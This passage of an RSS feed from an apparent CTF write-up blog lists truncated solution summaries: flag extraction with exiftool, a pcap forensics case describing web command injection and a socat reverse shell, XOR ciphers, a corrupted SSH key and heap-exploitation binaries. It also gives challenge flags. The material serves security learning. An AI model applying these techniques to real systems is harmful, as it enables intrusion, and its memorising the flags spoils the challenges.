$ exiftool 3UWLBAUCb9Z2.jpg | grep CTFlearn Camera Serial Number : CTFlearn{EEe_x_I_FFf}</description></item><item><title>Wrong Spooky Season</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/wrong-spooky-season/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/wrong-spooky-season/</guid><description>We are given a network traffic capture file called capture.pcap.
Traffic analysis We can use Wireshark to analyze it:
HTTP messages There are a lot of packages. Let&amp;rsquo;s filter by HTTP first:
Alright, we have significanly less packages to analyze.
There are some HTTP messages that stand out at the end. We guess that a malicious user is executing remote system commands on the server (cmd=whoami, cmd=id &amp;hellip;). The last message is using socat to obtain a reverse shell connection, we can select this packet and remove the HTTP filter.</description></item><item><title>Wrong Spooky Season</title><link>https://7rocky.github.io/en/ctf/other/hackthebooctf/wrong-spooky-season/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hackthebooctf/wrong-spooky-season/</guid><description>We are given a network traffic capture file called capture.pcap.
Traffic analysis We can use Wireshark to analyze it:
HTTP messages There are a lot of packages. Let&amp;rsquo;s filter by HTTP first:
Alright, we have significanly less packages to analyze.
There are some HTTP messages that stand out at the end. We guess that a malicious user is executing remote system commands on the server (cmd=whoami, cmd=id &amp;hellip;). The last message is using socat to obtain a reverse shell connection, we can select this packet and remove the HTTP filter.</description></item><item><title>XORed</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/xored/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/xored/</guid><description>The program says that someone has used a XOR cipher with a single byte key. This is the output: * 7%8-s70&amp;amp; 61&amp;amp;&amp;gt;.
Since we know that flags start with ictf{, we can get the key using &amp;quot;*&amp;quot; ^ &amp;quot;i&amp;quot; because of XOR cipher properties:
$$ c = m \oplus k \iff k = c \oplus m $$ So we solve the challenge like this:
$ python3 -q &amp;gt;&amp;gt;&amp;gt; from pwn import xor &amp;gt;&amp;gt;&amp;gt; c = b'* 7%8-s70&amp; 61&amp;&amp;gt;' &amp;gt;&amp;gt;&amp;gt; k = xor(c[0], b'i') &amp;gt;&amp;gt;&amp;gt; m = xor(c, k) &amp;gt;&amp;gt;&amp;gt; m b'ictf{n0tsecure}'</description></item><item><title>xorrot</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/xorrot/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/xorrot/</guid><description>We are given this source code to encrypt the flag, and also the ciphertext as a comment in the code:
#!/usr/bin/env python3 flag = open('flag.txt', 'rb').read() key = open('/dev/urandom','rb').read(1)[0] out = [] for c in flag: out.append(c ^ key) key = c print(f'{bytes(out).hex() = }') # bytes(out).hex() = '970a17121d121d2b28181a19083b2f021d0d03030e1526370d091c2f360f392b1c0d3a340e1c263e070003061711013b32021d173a2b1c090f31351f06072b2b1c0d3a390f1b01072b3c0b09132d33030311' From the source code, we see that the key is a single byte. Moreover, the key is updated with the current plain text character.</description></item><item><title>yaonet</title><link>https://7rocky.github.io/en/ctf/other/dicectf/yaonet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/dicectf/yaonet/</guid><description>We are given two files id_ecdsa, id_ecdsa.pub and a remote instance to connect using SSH:
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null yaonet@mc.ax -p 31000 -i id_ecdsa The private key id_ecdsa is corrupt:
-----BEGIN OPENSSH PRIVATE KEY----- ??????????1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAA???????????????????????? ??????????c3RwMjU2AAAACG5pc3RwMjU2AAAAQQR72Bqp???????????????????????? ??????????1hSxoXrVpRtsx1F2GIgXAqI/6MxuS7Bq86XF???????????????????????? ??????????ZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAy???????????????????????? ??????????lSEQfdEcgOhx7zvWFLGhetWlG2zHUXYYiBcC???????????????????????? ??????????37PMrof3dNCpeuwsSUupbaUh3/+7+eDnRH+3???????????????????????? -----END OPENSSH PRIVATE KEY----- And the public key id_ecdsa.pub is correct:
ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHvYGqk903tU4dOcBPTbZ9xl5rlSEQfdEcgOhx7zvWFLGhetWlG2zHUXYYiBcCoj/ozG5LsGrzpcXE3HuEzPEQg= yaonet We will need to fix the private key in order to connect to the remote instance and get the flag.</description></item><item><title>You Cant C Me</title><link>https://7rocky.github.io/en/ctf/htb-challenges/reversing/you-cant-c-me/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/reversing/you-cant-c-me/</guid><description>We have a binary called auth:
$ file auth auth: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, stripped If we run it, it asks for a key:
$ ./auth Welcome! We can introduce something and see that it is not correct:
$ ./baby Insert key: asdf I said, you can't c me! We can make use of ltrace to see every call to external functions (functions that belong to a library like Glibc):</description></item><item><title>zero_to_hero</title><link>https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/zero_to_hero/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/zero_to_hero/</guid><description>We are given a 64-bit binary called zero_to_hero:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./' We also have the Glibc shared library and the loader (version 2.29):
$ ./ld-2.29.so ./libc.so.6 GNU C Library (Ubuntu GLIBC 2.29-0ubuntu2) stable release version 2.29. Copyright (C) 2019 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</description></item><item><title>Zombie Rolled</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/zombie-rolled/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/zombie-rolled/</guid><description>We are given the Python source code to encrypt the flag:
from Crypto.Util.number import getPrime, bytes_to_long from fractions import Fraction from math import prod from hashlib import sha256 from secrets import randbelow # I hope no one cares about Kerckhoff's principle :) from secret import derive_public_key, FLAG def fraction_mod(f, n): return f.numerator * pow(f.denominator, -1, n) % n class PublicKey: def __init__(self, pub, n): self.pub = pub self.f = self.magic(pub) self.</description></item><item><title>Zombie Rolled</title><link>https://7rocky.github.io/en/ctf/other/htb-unictf/zombie-rolled/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-unictf/zombie-rolled/</guid><description>We are given the Python source code to encrypt the flag:
from Crypto.Util.number import getPrime, bytes_to_long from fractions import Fraction from math import prod from hashlib import sha256 from secrets import randbelow # I hope no one cares about Kerckhoff's principle :) from secret import derive_public_key, FLAG def fraction_mod(f, n): return f.numerator * pow(f.denominator, -1, n) % n class PublicKey: def __init__(self, pub): self.pub = pub self.f = self.magic(pub) self.nb = (self.</description></item><item><title>Zombiedote</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/zombiedote/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/zombiedote/</guid><description>We are given a 64-bit binary called zombiedote:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' Reverse engineering We have a typical menu for a heap exploitation challenge:
$ ./zombiedote [ BioShield Solutions Research Institute ] Virus Concentration Levels Logging - Manual Mode: ON [ MANUAL MODE LOGGING ] [1] Create log [2] Insert into log [3] Delete log [4] Edit log [5] Inspect log &amp;gt;&amp;gt; If we open the binary in Ghidra, we will see the decompiled C scource code for program.</description></item><item><title>Zombiedote</title><link>https://7rocky.github.io/en/ctf/other/htb-unictf/zombiedote/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-unictf/zombiedote/</guid><description>We are given a 64-bit binary called zombiedote:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' Reverse engineering We have a typical menu for a heap exploitation challenge:
$ ./zombiedote [ BioShield Solutions Research Institute ] Virus Concentration Levels Logging - Manual Mode: ON [ MANUAL MODE LOGGING ] [1] Create log [2] Insert into log [3] Delete log [4] Edit log [5] Inspect log &amp;gt;&amp;gt; If we open the binary in Ghidra, we will see the decompiled C scource code for program.</description></item><item><title>Zombienator</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/zombienator/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/zombienator/</guid><description>We are given a 64-bit binary called zombienator:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' Reverse engineering If we open the binary in Ghidra, we will see this decompiled C source code for the main function:
void main() { ulong option; banner(); while (true) { while (true) { while (true) { printf("\n##########################\n# #\n# 1. Create Zombienator #\ n# 2. Remove Zombienator #\n# 3.</description></item><item><title>Zombienator</title><link>https://7rocky.github.io/en/ctf/other/htb-unictf/zombienator/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-unictf/zombienator/</guid><description>We are given a 64-bit binary called zombienator:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/' Reverse engineering If we open the binary in Ghidra, we will see this decompiled C source code for the main function:
void main() { ulong option; banner(); while (true) { while (true) { while (true) { printf("\n##########################\n# #\n# 1. Create Zombienator #\ n# 2. Remove Zombienator #\n# 3.</description></item></channel></rss>